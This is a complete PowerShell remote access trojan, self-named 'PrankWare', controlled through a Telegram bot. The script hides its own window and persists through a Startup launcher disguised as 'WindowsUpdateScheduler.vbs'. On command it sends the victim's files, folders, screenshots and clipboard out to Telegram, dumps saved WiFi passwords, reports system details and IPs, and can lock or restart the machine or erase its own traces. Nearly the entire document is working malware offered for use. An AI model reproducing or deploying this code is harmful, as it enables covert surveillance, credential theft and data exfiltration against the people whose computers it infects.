Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned

if (-not $env:PS_RUN_HIDDEN -or $env:PS_RUN_HIDDEN -ne "1") {
    $env:PS_RUN_HIDDEN = "1"

    $scriptPath = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) {
        $scriptPath = "$PSScriptRoot\$($MyInvocation.InvocationName)"
    }

    if (-not (Test-Path $scriptPath)) {
        $scriptPath = "$env:TEMP\__temp_$(Get-Random).ps1"
        [System.IO.File]::WriteAllText($scriptPath, $MyInvocation.Line)
    }

    $vbsPath = "$env:TEMP\__launcher_$(Get-Random).vbs"
    $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$scriptPath"" -PS_RUN_HIDDEN 1", 0, False
"@
    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
    
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
    
    Start-Sleep -Seconds 2
    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
    
    exit
}

param(
    [string]$PS_RUN_HIDDEN = ""
)

if ($PS_RUN_HIDDEN -eq "1") {
    $env:PS_RUN_HIDDEN = "1"
}

if ($env:PS_RUN_HIDDEN -ne "1") {
    exit
}

# --- ALL FUNCTION DEFINITIONS START HERE ---

function Send-TelegramMessage {
    param (
        [string]$chatId,
        [string]$message
    )
    Invoke-RestMethod "$apiUrl/sendMessage" -Method Post -ContentType "application/json" -Body (@{
        chat_id = $chatId
        text = $message
    } | ConvertTo-Json -Depth 10)
}

function Get-PCName {
    return $env:COMPUTERNAME
}

function Send-TelegramFile {
    param (
        [string]$chatId,
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        return "File not found: $filePath"
    }

    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileName = [System.IO.Path]::GetFileName($filePath)

        $content = (
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"chat_id`"`r`n`r`n$chatId`r`n" +
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`n" +
            "Content-Type: application/octet-stream`r`n`r`n"
        )

        $footer = "`r`n--$boundary--`r`n"

        $contentBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

        $bodyBytes = New-Object byte[] ($contentBytes.Length + $fileBytes.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($contentBytes, 0, $bodyBytes, 0, $contentBytes.Length)
        [System.Buffer]::BlockCopy($fileBytes, 0, $bodyBytes, $contentBytes.Length, $fileBytes.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $contentBytes.Length + $fileBytes.Length, $footerBytes.Length)

        Invoke-RestMethod -Uri "$apiUrl/sendDocument" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
        return "File sent: $filePath"
    } catch {
        return "Error sending file: $_"
    }
}

function Get-LocalIP {
    $ipInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.PrefixLength -eq 24}
    return $ipInfo.IPAddress -join ' '
}

function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -Method Get
        return $publicIP.ip
    } catch {
        return "Unable to retrieve public IP."
    }
}

function Send-Screenshot {
    param (
        [string]$chatId
    )
    try {
        $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"

        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)

        $bitmap.Save($screenshotPath)
        $graphics.Dispose()
        $bitmap.Dispose()

        $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
        $fileContentBase64 = [Convert]::ToBase64String($fileContent)

        $boundary = [Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"$LF",
            "$chatId",
            "--$boundary",
            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
            "Content-Type: image/png$LF",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
            "--$boundary--$LF"
        ) -join $LF

        Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines

        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
        return $true
    }
    catch {
        return $false
    }
}

function Send-TelegramFolder {
    param (
        [string]$chatId,
        [string]$folderPath
    )

    if (-not (Test-Path $folderPath -PathType Container)) {
        return "Folder not found: $folderPath"
    }

    try {
        $zipPath = "$env:TEMP\$(Split-Path $folderPath -Leaf)_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
        Compress-Archive -Path $folderPath -DestinationPath $zipPath -Force
        $result = Send-TelegramFile -chatId $chatId -filePath $zipPath
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        return $result
    } catch {
        return "Error zipping/sending folder: $_"
    }
}

function Get-ClipboardContent {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        if ([string]::IsNullOrEmpty($clipboardText)) {
            return "Clipboard is empty or contains non-text content."
        }
        return $clipboardText
    } catch {
        return "Error reading clipboard: $_"
    }
}

function Get-SystemInfo {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $cs = Get-CimInstance Win32_ComputerSystem
        $proc = Get-CimInstance Win32_Processor
        $disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
        
        $info = @"
System Information:
------------------
Computer Name: $($cs.Name)
OS: $($os.Caption) $($os.OSArchitecture)
Version: $($os.Version)
Manufacturer: $($cs.Manufacturer)
Model: $($cs.Model)
Processor: $($proc.Name)
RAM: $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2)) GB
C: Drive: $([math]::Round($disk.Size / 1GB, 2)) GB total, $([math]::Round($disk.FreeSpace / 1GB, 2)) GB free
"@
        return $info
    } catch {
        return "Error retrieving system information: $_"
    }
}

function Get-WifiPasswords {
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        
        if (-not $profiles) {
            return "No WiFi profiles found."
        }
        
        $results = "Saved WiFi Networks and Passwords:`n----------------------------------`n"
        
        foreach ($profile in $profiles) {
            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" 
            
            if ($password) {
                $pass = $password.ToString().Split(":")[1].Trim()
                $results += "Network: $profile`nPassword: $pass`n`n"
            } else {
                $results += "Network: $profile`nPassword: [No Password Found]`n`n"
            }
        }
        
        return $results
    } catch {
        return "Error retrieving WiFi passwords: $_"
    }
}

function Set-ClipboardContent {
    param (
        [string]$text
    )
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::SetText($text)
        return $true
    } catch {
        return $false
    }
}

function Invoke-SelfDestruct {
    param (
        [string]$chatId
    )
    
    try {
        $scriptName = [System.IO.Path]::GetFileName($MyInvocation.MyCommand.Path)
        $startupFolder = [System.Environment]::GetFolderPath('Startup')
        $vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"
        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
        
        Send-TelegramMessage -chatId $chatId -message "Self-destruct initiated. Removing persistence..."
        
        if (Test-Path $vbsLauncherPath) {
            Remove-Item $vbsLauncherPath -Force -ErrorAction SilentlyContinue
            Send-TelegramMessage -chatId $chatId -message "Removed startup launcher."
        }
        
        if (Test-Path $hiddenScriptPath) {
            Remove-Item $hiddenScriptPath -Force -ErrorAction SilentlyContinue
            Send-TelegramMessage -chatId $chatId -message "Removed hidden script copy."
        }
        
        $cleanupScript = @"
Start-Sleep -Seconds 3
Remove-Item -Path "$($MyInvocation.MyCommand.Path)" -Force
"@
        
        $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
        [System.IO.File]::WriteAllText($cleanupPath, $cleanupScript)
        
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$cleanupPath`"" -WindowStyle Hidden
        
        Send-TelegramMessage -chatId $chatId -message "Self-destruct complete. Script will terminate now."
        
        exit
    }
    catch {
        Send-TelegramMessage -chatId $chatId -message "Error during self-destruct: $_"
    }
}

function Send-HelpMessage {
    param ([string]$chatId)
    $helpMessage = @"
Available Commands:

/help - Displays this help message.
/notepad - Opens Notepad.
/visit <url> - Opens a URL in the browser.
/lock - Locks workstation.
/restart - Restarts the computer.
/shutdown - Shuts down the computer.
/ip - Shows local and public IP.
/screenshot - Sends a screenshot.
/pcname - Shows the computer name.
/sendfile <path> - Sends a file from local disk.
/sendfolder <path> - Sends a zipped folder from local disk.
/getclipboard - Gets text from clipboard.
/setclipboard <text> - Sets text to clipboard.
/sysinfo - Displays detailed system information.
/wifi - Shows all saved WiFi networks and passwords.
/selfdestruct - Removes all traces of the script and terminates.
cd <path> - Change directory.
cd - Show current directory.
ls or dir - List files and folders.
"@
    Send-TelegramMessage -chatId $chatId -message $helpMessage
}

# --- ALL FUNCTION DEFINITIONS END HERE ---

$botToken = "meowurtoken"
$userId = "uruserid"
$apiUrl = "https://api.telegram.org/bot$botToken"
$lastUpdateId = 0 # Initial default


try {
    Write-Host "PrankWare: Checking for pending Telegram commands on startup..."
    $pendingUpdates = Invoke-RestMethod "$apiUrl/getUpdates?limit=100&timeout=10" 
    
    if ($pendingUpdates.ok -and $pendingUpdates.result.Count -gt 0) {
        $highestUpdateId = ($pendingUpdates.result | Sort-Object update_id -Descending | Select-Object -First 1).update_id
        
        if ($highestUpdateId -gt $lastUpdateId) {
            $lastUpdateId = $highestUpdateId
            $startupMessage = "PrankWare: Advanced update offset to $($lastUpdateId + 1) to skip $($pendingUpdates.result.Count) old/pending command(s)."
            Write-Host $startupMessage
        } else {
            Write-Host "PrankWare: No new pending commands to skip. Current offset is appropriate."
        }
    } elseif ($pendingUpdates.ok) {
        Write-Host "PrankWare: No pending commands found on startup."
    } else {
        $startupError = "PrankWare: Could not check for pending commands. API Error: $($pendingUpdates.description | Out-String)"
        Write-Host $startupError
    }
} catch {
    $exceptionMessage = $_.Exception.Message | Out-String
    $startupCatchError = "PrankWare: Error during startup check for pending commands: $exceptionMessage. Starting with default offset."
    Write-Host $startupCatchError
}

Send-TelegramMessage -chatId $userId -message "System is running on PC: $(Get-PCName)"

$scriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($scriptPath)
$startupFolder = [System.Environment]::GetFolderPath('Startup')
$destinationPath = Join-Path $startupFolder $scriptName

$vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"

$hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
if (-not (Test-Path $hiddenScriptPath)) {
    Copy-Item -Path $scriptPath -Destination $hiddenScriptPath
}

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$hiddenScriptPath"" -PS_RUN_HIDDEN 1", 0, False
"@
[System.IO.File]::WriteAllText($vbsLauncherPath, $vbsContent)


$global:CurrentDirectory = (Get-Location).Path

while ($true) {
    try {
        $updates = Invoke-RestMethod "$apiUrl/getUpdates?offset=$($lastUpdateId + 1)&timeout=10"
        foreach ($update in $updates.result) {
            $lastUpdateId = $update.update_id
            $chatId = $update.message.chat.id
            $text = $update.message.text.Trim()

            if ($chatId -ne $userId) { continue }

            if ($text -match "^cd\s+(.*)") {
                $targetPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($targetPath)) {
                    $targetPath = Join-Path $global:CurrentDirectory $targetPath
                }
                if (Test-Path $targetPath -PathType Container) {
                    $global:CurrentDirectory = (Resolve-Path $targetPath).Path
                    $reply = "Changed directory to: $global:CurrentDirectory"
                } else {
                    $reply = "Directory not found: $targetPath"
                }
            }
            elseif ($text -match "^cd$") {
                $reply = "Current directory: $global:CurrentDirectory"
            }
			elseif ($text -match "^(ls|dir)$") {
				try {
					$items = Get-ChildItem -Path $global:CurrentDirectory
					$reply = if ($items) {
						$list = foreach ($item in $items) {
							if ($item.PSIsContainer) {
								"[Folder] $($item.Name)"
							} else {
								"[File]   $($item.Name)"
							}
						}
						"Files and folders in $global:CurrentDirectory:`n" + ($list -join "`n")
					} else {
						"No files or folders found in $global:CurrentDirectory"
					}
				} catch {
					$reply = "Error reading directory: $_"
				}
			}
            elseif ($text -eq "/help") {
                Send-HelpMessage -chatId $chatId
                continue
            }
            elseif ($text -eq "/ip") {
                $localIP = Get-LocalIP
                $publicIP = Get-PublicIP
                $reply = "Local IP: $localIP`nPublic IP: $publicIP"
            }
            elseif ($text -eq "/pcname") {
                $pcName = Get-PCName
                $reply = "Computer Name: $pcName"
            }
            elseif ($text -eq "/notepad") {
                Start-Process notepad.exe
                $reply = "Notepad opened."
            }
            elseif ($text -match "^/visit\s+(http[s]?:\/\/.*)") {
                $url = $matches[1]
                [System.Diagnostics.Process]::Start($url)
                $reply = "Opened in browser: $url"
            }
            elseif ($text -eq "/lock") {
                rundll32.exe user32.dll,LockWorkStation
                $reply = "System locked."
            }
            elseif ($text -eq "/restart") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to restart the system? Send '/confirm-restart' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-restart") {
                shutdown /r /t 0
                $reply = "Restarting system..."
            }
            elseif ($text -eq "/shutdown") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to shut down the system? Send '/confirm-shutdown' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-shutdown") {
                shutdown /s /t 0
                $reply = "Shutting down system..."
            }
            elseif ($text -eq "/screenshot") {
                $reply = "Taking screenshot..."
                Send-TelegramMessage -chatId $chatId -message $reply
                $success = Send-Screenshot -chatId $chatId
                $reply = if ($success) { "Screenshot sent." } else { "Failed to capture screenshot." }
            }
            elseif ($text -match "^/sendfile\s+(.+)$") {
                $filePath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($filePath)) {
                    $filePath = Join-Path $global:CurrentDirectory $filePath
                }
                $reply = Send-TelegramFile -chatId $chatId -filePath $filePath
            }
            elseif ($text -match "^/sendfolder\s+(.+)$") {
                $folderPath = $matches[1].Trim('"')
                if (-not [System.IO.Path]::IsPathRooted($folderPath)) {
                    $folderPath = Join-Path $global:CurrentDirectory $folderPath
                }
                $reply = Send-TelegramFolder -chatId $chatId -folderPath $folderPath
            }
            elseif ($text -eq "/getclipboard") {
                $clipboardContent = Get-ClipboardContent
                $reply = "Clipboard content:`n$clipboardContent"
            }
            elseif ($text -match "^/setclipboard\s+(.+)$") {
                $clipText = $matches[1]
                $success = Set-ClipboardContent -text $clipText
                $reply = if ($success) { "Text set to clipboard: $clipText" } else { "Failed to set clipboard text." }
            }
            elseif ($text -eq "/sysinfo") {
                $sysInfo = Get-SystemInfo
                $reply = $sysInfo
            }
            elseif ($text -eq "/wifi") {
                $wifiPasswords = Get-WifiPasswords
                $reply = $wifiPasswords
            }
            elseif ($text -eq "/selfdestruct") {
                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to remove all traces of this script? Send '/confirm-selfdestruct' to confirm."
                continue
            }
            elseif ($text -eq "/confirm-selfdestruct") {
                Invoke-SelfDestruct -chatId $chatId
                continue
            }
            else {
                $reply = "Unknown command."
            }

            Send-TelegramMessage -chatId $chatId -message $reply
        }
        Start-Sleep -Seconds 2
    } catch {
        Start-Sleep -Seconds 5
    }
}
